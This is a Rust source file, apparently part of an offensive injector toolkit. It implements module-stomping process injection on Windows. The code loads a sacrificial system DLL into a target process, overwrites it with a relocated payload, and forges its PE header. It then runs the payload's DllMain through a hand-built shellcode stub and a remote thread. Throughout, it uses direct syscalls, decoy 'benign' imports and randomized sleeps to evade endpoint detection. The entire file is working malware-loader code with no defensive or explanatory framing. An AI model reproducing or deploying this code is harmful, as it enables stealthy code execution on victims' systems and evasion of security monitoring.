use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Memory::{PAGE_READWRITE, PAGE_EXECUTE_READ};
use std::ffi::c_void;
use std::ptr;

use kurion_sys::internal_api::{
    n_allocate_virtual_memory_syscall,
    n_write_virtual_memory_syscall,
    n_read_virtual_memory_syscall,
    n_create_thread_ex_syscall,
    n_protect_virtual_memory_syscall,
};
use kurion_sys::remote_patch::g_remote_module_base;
use crate::injector::benign_imports::r_benign_interleave;
use kurion_sys::sleep_obfuscation::j_sleep_range;

fn r_u16(data: &[u8], offset: usize) -> u16 {
    u16::from_le_bytes([data[offset], data[offset + 1]])
}

fn r_u32(data: &[u8], offset: usize) -> u32 {
    u32::from_le_bytes([data[offset], data[offset + 1], data[offset + 2], data[offset + 3]])
}

fn r_u64(data: &[u8], offset: usize) -> u64 {
    u64::from_le_bytes([
        data[offset], data[offset + 1], data[offset + 2], data[offset + 3],
        data[offset + 4], data[offset + 5], data[offset + 6], data[offset + 7],
    ])
}

struct SectionInfo {
    virtual_address: u32,
    virtual_size: u32,
    raw_data_offset: u32,
    raw_data_size: u32,
    characteristics: u32,
}

struct PayloadPeInfo {
    image_base: u64,
    entry_point_rva: u32,
    sections: Vec<SectionInfo>,
    reloc_rva: u32,
    reloc_size: u32,
}

fn p_payload_pe(dll_bytes: &[u8]) -> Result<PayloadPeInfo, String> {
    if dll_bytes.len() < 64 || &dll_bytes[0..2] != b"MZ" {
        return Err("Invalid DOS header".into());
    }

    let e_lfanew = r_u32(dll_bytes, 0x3C) as usize;
    if e_lfanew + 4 > dll_bytes.len() || &dll_bytes[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err("Invalid PE signature".into());
    }

    let file_header_off = e_lfanew + 4;
    let opt_header_off = file_header_off + 20;

    let magic = r_u16(dll_bytes, opt_header_off);
    if magic != 0x20B {
        return Err(format!("Not PE32+ (64-bit): magic=0x{:X}", magic));
    }

    let entry_point_rva = r_u32(dll_bytes, opt_header_off + 0x10);
    let image_base = r_u64(dll_bytes, opt_header_off + 0x18);
    let _size_of_image = r_u32(dll_bytes, opt_header_off + 0x38);

    let num_sections = r_u16(dll_bytes, file_header_off + 2) as usize;
    let size_of_opt_header = r_u16(dll_bytes, file_header_off + 16) as usize;
    let first_section_off = opt_header_off + size_of_opt_header;

    let reloc_rva = r_u32(dll_bytes, opt_header_off + 0x98);
    let reloc_size = r_u32(dll_bytes, opt_header_off + 0x9C);

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s_off = first_section_off + i * 40;
        if s_off + 40 > dll_bytes.len() {
            break;
        }
        sections.push(SectionInfo {
            virtual_address: r_u32(dll_bytes, s_off + 12),
            virtual_size: r_u32(dll_bytes, s_off + 8),
            raw_data_offset: r_u32(dll_bytes, s_off + 20),
            raw_data_size: r_u32(dll_bytes, s_off + 16),
            characteristics: r_u32(dll_bytes, s_off + 36),
        });
    }

    Ok(PayloadPeInfo {
        image_base,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
    })
}

fn a_relocations(dll_bytes: &mut [u8], pe: &PayloadPeInfo, delta: i64) -> Result<(), String> {
    if delta == 0 || pe.reloc_rva == 0 || pe.reloc_size == 0 {
        return Ok(());
    }

    let reloc_section = pe.sections.iter().find(|s| {
        pe.reloc_rva >= s.virtual_address
            && pe.reloc_rva < s.virtual_address + s.virtual_size
    });

    let reloc_file_offset = match reloc_section {
        Some(s) => (pe.reloc_rva - s.virtual_address + s.raw_data_offset) as usize,
        None => return Err("Could not find .reloc section".into()),
    };

    let reloc_end = reloc_file_offset + pe.reloc_size as usize;
    if reloc_end > dll_bytes.len() {
        return Err("Reloc data exceeds file size".into());
    }

    let mut offset = reloc_file_offset;
    while offset + 8 <= reloc_end {
        let page_rva = r_u32(dll_bytes, offset) as usize;
        let block_size = r_u32(dll_bytes, offset + 4) as usize;

        if block_size < 8 || offset + block_size > reloc_end {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry = r_u16(dll_bytes, offset + 8 + i * 2);
            let reloc_type = entry >> 12;
            let reloc_offset = (entry & 0x0FFF) as usize;

            if reloc_type == 0 {
                continue;
            }

            if reloc_type == 10 {
                let reloc_rva = page_rva + reloc_offset;
                let file_off = r_to_file_offset(&pe.sections, reloc_rva);
                if let Some(fo) = file_off {
                    if fo + 8 <= dll_bytes.len() {
                        let val = u64::from_le_bytes([
                            dll_bytes[fo], dll_bytes[fo + 1], dll_bytes[fo + 2], dll_bytes[fo + 3],
                            dll_bytes[fo + 4], dll_bytes[fo + 5], dll_bytes[fo + 6], dll_bytes[fo + 7],
                        ]);
                        let new_val = (val as i64 + delta) as u64;
                        dll_bytes[fo..fo + 8].copy_from_slice(&new_val.to_le_bytes());
                    }
                }
            }
        }

        offset += block_size;
    }

    Ok(())
}

fn r_to_file_offset(sections: &[SectionInfo], rva: usize) -> Option<usize> {
    for s in sections {
        let s_start = s.virtual_address as usize;
        let s_end = s_start + s.virtual_size as usize;
        if rva >= s_start && rva < s_end {
            return Some(rva - s_start + s.raw_data_offset as usize);
        }
    }
    None
}

const SACRIFICIAL_DLLS: &[&str] = &[
    "C:\\Windows\\System32\\dbghelp.dll",
    "C:\\Windows\\System32\\wldp.dll",
    "C:\\Windows\\System32\\srpapi.dll",
];

unsafe fn l_sacrificial_dll(
    h_process: HANDLE,
    dll_path: &str,
) -> Result<usize, String> {
    use windows::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};

    let wide: Vec<u16> = dll_path.encode_utf16().chain(std::iter::once(0)).collect();
    let wide_bytes: Vec<u8> = wide.iter().flat_map(|w| w.to_le_bytes()).collect();

    let kernel32 = windows::Win32::System::LibraryLoader::GetModuleHandleA(
        windows::core::s!("kernel32.dll"),
    ).map_err(|e| format!("Failed to get kernel32: {}", e))?;

    let load_library_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
        kernel32,
        windows::core::s!("LoadLibraryW"),
    ).ok_or("Failed to find LoadLibraryW")?;

    let mut buf_addr: *mut c_void = ptr::null_mut();
    let mut buf_size = wide_bytes.len();

    let status = n_allocate_virtual_memory_syscall(
        h_process,
        &mut buf_addr,
        0,
        &mut buf_size,
        (MEM_COMMIT | MEM_RESERVE).0,
        PAGE_READWRITE.0,
    );
    if status.0 != 0 {
        return Err(format!("NtAllocateVirtualMemory for path failed: 0x{:X}", status.0));
    }

    let mut bytes_written = 0usize;
    let status = n_write_virtual_memory_syscall(
        h_process,
        buf_addr,
        wide_bytes.as_ptr() as *mut c_void,
        wide_bytes.len(),
        &mut bytes_written,
    );
    if status.0 != 0 {
        return Err(format!("NtWriteVirtualMemory for path failed: 0x{:X}", status.0));
    }

    let mut h_thread = HANDLE(ptr::null_mut());
    let status = n_create_thread_ex_syscall(
        &mut h_thread,
        0x1FFFFF,
        ptr::null_mut(),
        h_process,
        load_library_addr as *mut c_void,
        buf_addr,
        0, 0, 0, 0,
        ptr::null_mut(),
    );
    if status.0 != 0 {
        return Err(format!("NtCreateThreadEx for LoadLibraryW failed: 0x{:X}", status.0));
    }

    let mut timeout: i64 = -50_000_000;
    let _ = kurion_sys::internal_api::n_wait_for_single_object_syscall(
        h_thread,
        false,
        &mut timeout,
    );
    let _ = kurion_sys::internal_api::n_close_syscall(h_thread.0);

    let dll_name = std::path::Path::new(dll_path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(dll_path);

    g_remote_module_base(h_process, dll_name)
        .ok_or_else(|| format!("Sacrificial DLL '{}' not found in remote PEB after loading", dll_name))
}

unsafe fn r_remote_sections(
    h_process: HANDLE,
    module_base: usize,
) -> Result<(Vec<SectionInfo>, u32), String> {
    let mut dos_header = [0u8; 64];
    let mut bytes_read = 0usize;
    let status = n_read_virtual_memory_syscall(
        h_process,
        module_base as *mut c_void,
        dos_header.as_mut_ptr() as *mut c_void,
        64,
        &mut bytes_read,
    );
    if status.0 != 0 || dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return Err("Failed to read remote DOS header".into());
    }

    let e_lfanew = r_u32(&dos_header, 0x3C) as usize;

    let mut nt_headers = [0u8; 0x110];
    let status = n_read_virtual_memory_syscall(
        h_process,
        (module_base + e_lfanew) as *mut c_void,
        nt_headers.as_mut_ptr() as *mut c_void,
        0x110,
        &mut bytes_read,
    );
    if status.0 != 0 {
        return Err("Failed to read remote NT headers".into());
    }

    let num_sections = r_u16(&nt_headers, 6) as usize;
    let size_of_opt_header = r_u16(&nt_headers, 20) as usize;
    let size_of_image = r_u32(&nt_headers, 24 + 0x38);
    let first_section_off = e_lfanew + 4 + 20 + size_of_opt_header;

    let sections_size = num_sections * 40;
    let mut section_data = vec![0u8; sections_size];
    let status = n_read_virtual_memory_syscall(
        h_process,
        (module_base + first_section_off) as *mut c_void,
        section_data.as_mut_ptr() as *mut c_void,
        sections_size,
        &mut bytes_read,
    );
    if status.0 != 0 {
        return Err("Failed to read remote section headers".into());
    }

    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let off = i * 40;
        sections.push(SectionInfo {
            virtual_address: r_u32(&section_data, off + 12),
            virtual_size: r_u32(&section_data, off + 8),
            raw_data_offset: r_u32(&section_data, off + 20),
            raw_data_size: r_u32(&section_data, off + 16),
            characteristics: r_u32(&section_data, off + 36),
        });
    }

    Ok((sections, size_of_image))
}

pub unsafe fn s_and_execute(
    h_process: HANDLE,
    payload_bytes: &[u8],
) -> Result<(), String> {
    let pe = p_payload_pe(payload_bytes)?;
    let payload_total_size: u32 = pe.sections.iter()
        .map(|s| s.virtual_address + s.virtual_size)
        .max()
        .unwrap_or(0);

    let mut module_base: Option<usize> = None;

    for dll_path in SACRIFICIAL_DLLS {
        match l_sacrificial_dll(h_process, dll_path) {
            Ok(base) => {
                if let Ok((_remote_sections, remote_size)) = r_remote_sections(h_process, base) {
                    if remote_size >= payload_total_size {
                        module_base = Some(base);
                        break;
                    }
                }
            }
            Err(_) => continue,
        }
    }

    let remote_base = module_base
        .ok_or("No sacrificial DLL could be loaded or was large enough")?;

    let delta = remote_base as i64 - pe.image_base as i64;
    let mut relocated_payload = payload_bytes.to_vec();
    a_relocations(&mut relocated_payload, &pe, delta)?;

    for section in &pe.sections {
        if section.raw_data_size == 0 {
            continue;
        }

        let dest_addr = remote_base + section.virtual_address as usize;
        let section_size = section.virtual_size.max(section.raw_data_size) as usize;

        let mut protect_addr = dest_addr as *mut c_void;
        let mut protect_size = section_size;
        let mut old_protect: u32 = 0;

        let status = n_protect_virtual_memory_syscall(
            h_process,
            &mut protect_addr,
            &mut protect_size,
            PAGE_READWRITE.0,
            &mut old_protect,
        );
        if status.0 != 0 {
            return Err(format!(
                "NtProtectVirtualMemory(RW) failed at 0x{:X}: 0x{:X}",
                dest_addr, status.0
            ));
        }

        let src_start = section.raw_data_offset as usize;
        let src_end = src_start + section.raw_data_size as usize;
        if src_end > relocated_payload.len() {
            continue;
        }
        let src_data = &relocated_payload[src_start..src_end];

        let mut bytes_written = 0usize;
        let status = n_write_virtual_memory_syscall(
            h_process,
            dest_addr as *mut c_void,
            src_data.as_ptr() as *mut c_void,
            src_data.len(),
            &mut bytes_written,
        );
        if status.0 != 0 {
            return Err(format!(
                "NtWriteVirtualMemory failed at 0x{:X}: 0x{:X}",
                dest_addr, status.0
            ));
        }

        r_benign_interleave();
        j_sleep_range(10, 50);

        let final_protect = s_characteristics_to_protection(section.characteristics);
        protect_addr = dest_addr as *mut c_void;
        protect_size = section_size;

        let status = n_protect_virtual_memory_syscall(
            h_process,
            &mut protect_addr,
            &mut protect_size,
            final_protect,
            &mut old_protect,
        );
        if status.0 != 0 {
        }
    }

    let entry_point = remote_base + pe.entry_point_rva as usize;
    let shellcode = b_dllmain_shellcode(remote_base as u64, entry_point as u64);

    const SC_OFFSET: usize = 0xF80;
    debug_assert!(
        SC_OFFSET + shellcode.len() <= 0x1000,
        "shellcode stub overflows header page slot"
    );

    let mut fake_header = vec![0u8; 0x1000];
    if payload_bytes.len() >= 0x1000 {
        fake_header.copy_from_slice(&payload_bytes[0..0x1000]);
        let e_lfanew = r_u32(&fake_header, 0x3C) as usize;
        let ts_offset = e_lfanew + 4 + 4;
        if ts_offset + 4 < fake_header.len() {
            let nanos = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .subsec_nanos();
            let timestamp = nanos
                .wrapping_add(payload_bytes.len() as u32)
                .wrapping_mul(0x9E3779B9);
            fake_header[ts_offset..ts_offset + 4].copy_from_slice(&timestamp.to_le_bytes());
        }
    } else {
        fake_header[0] = b'M'; fake_header[1] = b'Z';
        fake_header[0x3C] = 0x40;
        fake_header[0x40] = b'P'; fake_header[0x41] = b'E';
        let seed = payload_bytes.len() as u64;
        for i in 0x100..SC_OFFSET {
            fake_header[i] = (seed.wrapping_mul(6364136223846793005).wrapping_add(i as u64) & 0xFF) as u8;
        }
    }

    fake_header[SC_OFFSET..SC_OFFSET + shellcode.len()].copy_from_slice(&shellcode);

    let mut protect_addr = remote_base as *mut c_void;
    let mut protect_size = 0x1000usize;
    let mut old_protect: u32 = 0;

    let _ = n_protect_virtual_memory_syscall(
        h_process,
        &mut protect_addr,
        &mut protect_size,
        PAGE_READWRITE.0,
        &mut old_protect,
    );

    r_benign_interleave();

    let mut bw = 0usize;
    let _ = n_write_virtual_memory_syscall(
        h_process,
        remote_base as *mut c_void,
        fake_header.as_ptr() as *mut c_void,
        fake_header.len(),
        &mut bw,
    );

    j_sleep_range(30, 80);

    protect_addr = remote_base as *mut c_void;
    protect_size = 0x1000;
    let _ = n_protect_virtual_memory_syscall(
        h_process,
        &mut protect_addr,
        &mut protect_size,
        PAGE_EXECUTE_READ.0,
        &mut old_protect,
    );

    r_benign_interleave();

    let stub_addr = (remote_base + SC_OFFSET) as *mut c_void;

    let mut h_thread = HANDLE(ptr::null_mut());
    let status = n_create_thread_ex_syscall(
        &mut h_thread,
        0x1FFFFF,
        ptr::null_mut(),
        h_process,
        stub_addr,
        ptr::null_mut(),
        0, 0, 0, 0,
        ptr::null_mut(),
    );
    if status.0 != 0 {
        return Err(format!("NtCreateThreadEx for DllMain failed: 0x{:X}", status.0));
    }

    let mut timeout: i64 = -100_000_000;
    let _ = kurion_sys::internal_api::n_wait_for_single_object_syscall(
        h_thread,
        false,
        &mut timeout,
    );
    let _ = kurion_sys::internal_api::n_close_syscall(h_thread.0);

    Ok(())
}

fn b_dllmain_shellcode(dll_base: u64, entry_point: u64) -> Vec<u8> {
    let mut sc = Vec::with_capacity(64);

    sc.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);

    sc.extend_from_slice(&[0x48, 0xB9]);
    sc.extend_from_slice(&dll_base.to_le_bytes());

    sc.extend_from_slice(&[0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00]);

    sc.extend_from_slice(&[0x4D, 0x31, 0xC0]);

    sc.extend_from_slice(&[0x48, 0xB8]);
    sc.extend_from_slice(&entry_point.to_le_bytes());

    sc.extend_from_slice(&[0xFF, 0xD0]);

    sc.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);

    sc.extend_from_slice(&[0x31, 0xC0]);

    sc.push(0xC3);

    sc
}

fn s_characteristics_to_protection(characteristics: u32) -> u32 {
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
    const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
    const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;

    let r = characteristics & IMAGE_SCN_MEM_READ != 0;
    let w = characteristics & IMAGE_SCN_MEM_WRITE != 0;
    let x = characteristics & IMAGE_SCN_MEM_EXECUTE != 0;

    match (x, w, r) {
        (true, true, _) => 0x40,
        (true, false, true) => 0x20,
        (true, false, false) => 0x20,
        (false, true, _) => 0x04,
        (false, false, true) => 0x02,
        _ => 0x02,
    }
}
